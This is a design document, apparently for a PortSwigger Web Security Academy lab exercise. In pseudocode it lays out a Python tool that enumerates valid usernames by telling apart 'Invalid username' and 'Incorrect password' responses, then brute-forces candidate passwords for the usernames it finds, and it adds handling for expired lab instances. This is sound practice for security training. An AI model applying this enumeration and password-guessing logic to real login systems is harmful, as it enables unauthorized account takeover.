# Username Enumeration and Password Check Python automation Design

## Purpose

The workflow has two gated phases. The username phase uses a deliberately incorrect control password to distinguish recognized usernames from unrecognized ones. The password phase runs only for usernames recognized in the first phase as valid by the lab and stops trying passwords for a username after a successful login.

In this design, **cascading failure point** means that each stage must pass before the next stage is evaluated. A failed session check or runtime request error stops the workflow; it is not treated as a username or password result.

## Response classification

Classify each login response in this order:

```text
if the request fails or the response is an HTTP 5xx error:
    return RUNTIME_ERROR

if the response indicates the Chromium lab session has expired:
    return SESSION_EXPIRED

if the final response path is "/my-account":
    return LOGIN_SUCCESS

if the response body contains "Incorrect password":
    return VALID_USERNAME_WRONG_PASSWORD

if the response body contains "Invalid username":
    return INVALID_USERNAME

return UNCLASSIFIED
```

A 504 is handled as a runtime or session failure, stopping evaluation. The lab's explicit "Invalid username" response is classified as an invalid username.

## Phase 1: enumerate usernames

```text
function enumerate_usernames(candidateUsers, controlPassword):
    validUsers = []
    invalidUsers = []
    discoveredCredentials = []
    unclassifiedUsers = []

    verify the Chromium lab session is active
    if the session check fails:
        stop with SESSION_EXPIRED or RUNTIME_ERROR

    for username in candidateUsers, with duplicates removed:
        response = submit_login(username, controlPassword)
        result = classify(response)

        if result is RUNTIME_ERROR or SESSION_EXPIRED:
            stop; do not classify this attempt as a username result

        if result is LOGIN_SUCCESS:
            add username to validUsers
            add (username, controlPassword) to discoveredCredentials
        else if result is VALID_USERNAME_WRONG_PASSWORD:
            add username to validUsers
        else if result is INVALID_USERNAME:
            add username to invalidUsers
        else:
            add username to unclassifiedUsers

    return validUsers, invalidUsers, discoveredCredentials, unclassifiedUsers
```

For the current lab, `validUsers` may contain more than one username. It is represented as a list so the password phase can support multiple recognized usernames later.

## Phase 2: test password candidates

```text
function test_passwords(validUsers, candidatePasswords):
    foundCredentials = []
    unclassifiedResults = []

    verify the Chromium lab session is active
    if the session check fails:
        stop with SESSION_EXPIRED or RUNTIME_ERROR

    if candidatePasswords is empty:
        return UNCLASSIFIED("no password candidates; no attempts made")

    for username in validUsers:
        for password in candidatePasswords, with duplicates removed:
            response = submit_login(username, password)
            result = classify(response)

            if result is RUNTIME_ERROR or SESSION_EXPIRED:
                stop; do not classify this attempt as a password result

            if result is LOGIN_SUCCESS:
                add (username, password) to foundCredentials
                stop trying passwords for this username
            else if result is VALID_USERNAME_WRONG_PASSWORD:
                continue with the next password candidate
            else if result is INVALID_USERNAME:
                record that the username is no longer recognized
                stop trying passwords for this username
            else:
                add (username, password) to unclassifiedResults

    return foundCredentials, unclassifiedResults
```

If the list is non-empty and every candidate returns "Incorrect password", the outcome is **no password found in the supplied candidates**, not an unclassified response. An empty list is different: no password request was evaluated, so it returns an explicit unclassified/no-attempt status.

## Implementation note

The current Python draft uses `urllib` with its own `CookieJar`. Initially the firefox url was manually pasted to the portswigger Chromium's browser session. Therefore, Chromium inactivity and session expiry were not currently detected by that draft. To implement the session gate above, add a reliable session-health check through the browser workflow, or define and check a specific response marker returned when that session is expired: `Server Error: Gateway Timeout (0) connecting to 0a6300de036ff6a68197077700cf0051.web-security-academy.net`. A 504 or other 5xx response should stop the run as a runtime failure.

## Recovery flow for an expired lab instance

The browser controller owns lab-instance recovery; the login checker owns request classification. A 504 or a known expired-instance response pauses the checker, asks the controller to obtain a fresh instance.
```text
function run_lab_workflow():
    recoveryCount = 0
    maximumRecoveries = 2

    while recoveryCount <= maximumRecoveries:
        instanceURL = browser_controller.get_current_instance_url()

        if instanceURL is missing or instanceURL is stale:
            instanceURL = browser_controller.launch_fresh_instance()

        # A new instance usually generates different users and passwords.
        # Only reuse enumeration results for evaluated instance.
        instanceState = {
            "instanceURL": instanceURL,
            "validUsers": [],
            "invalidUsers": [],
            "foundCredentials": [],
            "phase": "username_enumeration",
        }

        outcome = enumerate_usernames(instanceURL, candidateUsers, controlPassword)

        if outcome is SESSION_EXPIRED or outcome is INSTANCE_GATEWAY_TIMEOUT:
            recoveryCount += 1
            continue
        if outcome is RUNTIME_ERROR:
            report the runtime error

        instanceState.validUsers = outcome.validUsers

        if candidatePasswords is empty:
            return UNCLASSIFIED("no password candidates; no password attempts made")

        instanceState.phase = "password_checks"
        outcome = test_passwords(
            instanceURL,
            instanceState.validUsers,
            candidatePasswords,
        )

        if outcome is SESSION_EXPIRED or outcome is INSTANCE_GATEWAY_TIMEOUT:
            recoveryCount += 1
            continue
        if outcome is RUNTIME_ERROR:
            report the runtime error

        return outcome

     report "Unable to obtain a stable lab instance after bounded retries"
```

```text
function browser_controller.launch_fresh_instance():
    open the Web Security Academy lab description page
    if the Academy browser is signed out:
        pause and ask the user to sign in, then resume

    click "Access the lab"
    wait for the lab instance tab to load
    navigate to "My account"

    if the instance page loads unsuccessfully:
        return INSTANCE_GATEWAY_TIMEOUT or RUNTIME_ERROR

    instanceURL = read the active instance origin from the browser address bar
    return instanceURL
```

On recovery, the workflow starts username enumeration again because a newly launched instance may have different account data. The controller updates the script's base URL to the new instance URL and evaluate results with that instance. Also, if launching a replacement instance fails, the controller should avoid looping indefinitely.

